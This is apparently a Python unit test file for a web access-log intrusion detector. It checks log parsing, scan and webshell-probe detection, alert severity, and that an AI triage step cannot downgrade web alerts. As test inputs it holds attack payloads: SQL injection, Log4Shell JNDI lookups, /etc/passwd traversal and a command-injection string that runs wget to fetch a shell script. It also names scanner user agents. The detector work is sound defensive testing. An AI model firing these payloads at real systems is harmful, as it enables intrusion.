import os
import sys
import tempfile
import unittest
from datetime import datetime
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "app"))
import web_watch
import notify
import ai_triage


def common(path, status=404, date=None):
    date = date or datetime.now().astimezone().strftime("%d/%b/%Y:%H:%M:%S %z")
    return f'203.0.113.8 - - [{date}] "GET {path} HTTP/1.1" {status} 123 "-" "test"\n'


class Notifier:
    def __init__(self):
        self.alerts = []

    def alert(self, *args):
        self.alerts.append(args)


class WebWatchTests(unittest.TestCase):
    def test_parses_nginx_and_npm_without_trusting_forwarded_headers(self):
        self.assertEqual(web_watch.parse_line(common("/.env?token=abc"))[3:], ("/.env", 404, False))
        npm = ('[26/Sep/2026:12:00:00 +0900] - 404 404 - GET https app.example '
               '"/.git/config" [Client 2001:db8::1] [Length 12] [Gzip -] '
               '[Sent-to 10.0.0.1] "bot" "-"\n')
        self.assertEqual(web_watch.parse_line(npm)[1:5],
                         ("2001:db8::1", "app.example", "/.git/config", 404))
        self.assertTrue(web_watch.parse_line(common("/files?name=..%2Fsecrets%2Fkeys.txt"))[-1])
        self.assertIsNone(web_watch.parse_line("not an access log"))

    def test_initial_tail_partial_line_rotation_and_scan_detection(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(common("/old"), encoding="utf-8")
            notifier = Notifier()
            with patch.object(web_watch, "STATE_PATH", str(Path(tmp) / "state.json")), \
                 patch.dict(os.environ, {"HITIDS_FS_PREFIX": ""}, clear=False):
                watcher = web_watch.WebWatcher({"log_paths": [str(path)], "scan_distinct_paths": 2}, notifier)
                watcher.check()
                self.assertFalse(notifier.alerts)
                with path.open("a") as f:
                    f.write(common("/.env") + common("/.git/config").rstrip("\n"))
                watcher.check()
                self.assertFalse(notifier.alerts)  # incomplete line must wait
                with path.open("a") as f:
                    f.write("\n")
                watcher.check()
                self.assertEqual(len(notifier.alerts), 1)
                self.assertIn("機密・管理パス", notifier.alerts[0][1])
                path.rename(Path(tmp) / "access.log.1")
                path.write_text(common("/wp-admin") + common("/phpmyadmin"), encoding="utf-8")
                watcher.check()
                self.assertEqual(len(notifier.alerts), 1)  # cooldown
                restarted = web_watch.WebWatcher({"log_paths": [str(path)]}, notifier)
                restarted.check()
                self.assertEqual(len(notifier.alerts), 1)  # persisted offset

    def test_web_alert_cannot_be_downgraded_by_ai(self):
        with tempfile.TemporaryDirectory() as tmp, \
             patch.object(ai_triage, "triage", return_value=ai_triage.TriageResult(False, "正常と判定")):
            n = notify.Notifier({"log_file": str(Path(tmp) / "alerts.log")},
                                {"auto_dismiss_non_threats": True}, {"enabled": False})
            with patch.object(n, "_send_central") as central:
                n.alert("web_watch", "Webアクセス異常", "warning")
            self.assertFalse(central.called)
            self.assertIn("[WARNING]", (Path(tmp) / "alerts.log").read_text())


class WebAttackRuleTests(unittest.TestCase):
    """ペイロード・スキャナ・スクリプト探索・成功応答の検知"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        patcher = patch.object(web_watch, "STATE_PATH", str(Path(self.tmp.name) / "state.json"))
        patcher.start()
        self.addCleanup(patcher.stop)
        self.n = Notifier()

    def watcher(self, **cfg):
        return web_watch.WebWatcher({"log_paths": [], **cfg}, self.n)

    @staticmethod
    def ev(path, status=404, ip="93.184.216.34", host="app.example", ts=1_000_000.0, ua="Mozilla/5.0"):
        line = (f'[26/Sep/2026:12:00:00 +0900] - {status} {status} - GET https {host} "{path}" '
                f'[Client {ip}] [Length 12] [Gzip -] [Sent-to 10.0.0.1] "{ua}" "-"\n')
        e = web_watch.parse_event(line)
        e["ts"] = ts
        return e

    def kinds(self, severity=None):
        return [(a[2] if len(a) > 2 else "warning", a[1]) for a in self.n.alerts
                if severity is None or (a[2] if len(a) > 2 else "warning") == severity]

    def test_ua_and_payload_kinds_are_parsed(self):
        e = self.ev("/?q=1%20union%20select%20password%20from%20users", ua="sqlmap/1.7")
        self.assertEqual(e["ua"], "sqlmap/1.7")
        self.assertEqual(web_watch.payload_kinds(e["full"]), ["SQLi"])
        self.assertEqual(web_watch.payload_kinds(self.ev("/?x=${jndi:ldap://a/b}")["full"]), ["Log4Shell"])
        self.assertEqual(web_watch.payload_kinds(self.ev("/?f=../../etc/passwd")["full"]), ["LFI"])
        self.assertEqual(web_watch.payload_kinds(self.ev("/?c=a;wget%20http://x/y.sh")["full"]), ["RCE"])
        self.assertEqual(web_watch.payload_kinds(self.ev("/search?q=hello%20world&page=2")["full"]), [])
        common_line = common("/x") .rstrip("\n")
        self.assertEqual(web_watch.parse_event(common_line)["ua"], "test")

    def test_payload_and_scanner_warn_without_leaking_url(self):
        w = self.watcher()
        w._process(self.ev("/?x=${jndi:ldap://evil/a}", status=200))
        w._process(self.ev("/", ua="Mozilla/5.0 (compatible; Nikto/2.5.0)", ts=1_000_001.0, ip="151.101.1.1"))
        msgs = [m for _, m in self.kinds("warning")]
        self.assertTrue(any("攻撃ペイロード" in m and "種別=Log4Shell" in m for m in msgs))
        self.assertTrue(any("脆弱性スキャナ" in m for m in msgs))
        self.assertFalse(any("jndi" in m or "evil" in m for m in msgs))
        self.assertEqual(self.kinds("critical"), [])  # クエリを無視して200を返しただけではCRITICALにしない

    def test_script_probe_needs_several_distinct_scripts(self):
        w = self.watcher(script_probe_paths=3)
        for i, name in enumerate(["/1.php", "/shell.php"]):
            w._process(self.ev(name, ts=1_000_000.0 + i))
        self.assertFalse([m for _, m in self.kinds() if "スクリプト" in m])
        w._process(self.ev("/x.jsp", ts=1_000_005.0))
        self.assertTrue([m for _, m in self.kinds("warning") if "スクリプト・Webシェルの探索" in m])

    def test_success_on_sensitive_path_is_critical_only_on_404_hosts(self):
        w = self.watcher()
        w._process(self.ev("/.env", status=200, ts=1_000_000.0))  # このホストの404を未観測(SPAの可能性)
        self.assertEqual(self.kinds("critical"), [])
        w._process(self.ev("/nonexistent", status=404, ts=1_000_001.0))
        w._process(self.ev("/.env", status=200, ts=1_000_002.0, ip="151.101.1.2"))
        crit = self.kinds("critical")
        self.assertEqual(len(crit), 1)
        self.assertIn("成功応答", crit[0][1])
        self.assertIn("host=app.example", crit[0][1])

    def test_script_hosts_and_private_clients_are_exempt(self):
        w = self.watcher(script_hosts=["legacy.example"])
        w._process(self.ev("/nonexistent", status=404, host="legacy.example"))
        w._process(self.ev("/index.php", status=200, host="legacy.example", ts=1_000_001.0))
        self.assertEqual(self.kinds("critical"), [])
        w._process(self.ev("/", ua="sqlmap", ip="192.168.1.5", ts=1_000_002.0))
        self.assertFalse([m for _, m in self.kinds() if "スキャナ" in m])
        w2 = self.watcher(ignore_private_ips=False)
        w2._process(self.ev("/", ua="sqlmap", ip="192.168.1.5"))
        self.assertTrue([m for _, m in self.kinds() if "スキャナ" in m])

    def test_old_tuple_event_still_supported(self):
        w = self.watcher()
        w._process((1_000_000.0, "93.184.216.34", "h", "/", 200, False))  # 旧形式でも落ちない


if __name__ == "__main__":
    unittest.main()
